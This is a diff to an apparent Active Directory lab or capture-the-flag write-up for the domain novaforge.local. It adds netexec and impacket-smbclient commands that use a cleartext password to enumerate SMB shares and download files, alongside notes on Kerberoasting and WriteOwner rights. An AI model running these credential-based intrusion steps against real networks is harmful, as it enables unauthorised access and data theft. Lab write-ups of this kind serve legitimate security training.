@@ -398,7 +398,7 @@ distinguishedName: DC=_msdcs.novaforge.local,CN=MicrosoftDNS,DC=ForestDnsZones,D
 permission: CREATE_CHILD
 ```
 
-Looks like this user has WriteOwner on the Deleted objects!
+Looks like this user has WriteOwner on the Deleted objects, something to keep in mind!
 
 # Kerberoasting
 
@@ -414,3 +414,43 @@ LDAP        10.0.0.100      389    DC               $krb5tgs$18$svc_it_admin$NOV
 
 This users hash cannot be cracked however
 
+# Access on `storage.novaforge.local`
+
+```python
+nxc smb storage.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5 --shares
+SMB         10.0.0.101      445    STORAGE          [*] Windows 11 / Server 2025 Build 26100 x64 (name:STORAGE) (domain:novaforge.local) (signing:True) (SMBv1:None)
+SMB         10.0.0.101      445    STORAGE          [+] novaforge.local\john.doe:johndoe1369 
+SMB         10.0.0.101      445    STORAGE          [*] Enumerated shares
+SMB         10.0.0.101      445    STORAGE          Share           Permissions     Remark
+SMB         10.0.0.101      445    STORAGE          -----           -----------     ------
+SMB         10.0.0.101      445    STORAGE          ADMIN$                          Remote Admin
+SMB         10.0.0.101      445    STORAGE          C$                              Default share
+SMB         10.0.0.101      445    STORAGE          IPC$            READ            Remote IPC
+SMB         10.0.0.101      445    STORAGE          Shared          READ
+```
+
+I have read access on the `Shared` share
+
+```python
+impacket-smbclient novaforge.local/john.doe:'johndoe1369'@storage.novaforge.local
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# shares
+Share Name                Type            Comment
+----------------------------------------------------------------------
+ADMIN$                    DISK (SPECIAL)  Remote Admin
+C$                        DISK (SPECIAL)  Default share
+IPC$                      IPC (SPECIAL)   Remote IPC
+Shared                    DISK            
+# use Shared
+# ls
+drw-rw-rw-          0  Sat Jun 20 16:30:40 2026 .
+drw-rw-rw-          0  Sat Jun 20 01:14:08 2026 ..
+-rw-rw-rw-    3205143  Sat Jun 20 16:30:40 2026 NovaForge Browser Security Policy.pdf
+-rw-rw-rw-     415889  Fri Jun 19 15:35:23 2026 StorageAccessOverview.pdf
+# mget *
+[*] Downloading NovaForge Browser Security Policy.pdf
+[*] Downloading StorageAccessOverview.pdf
+# 
+```
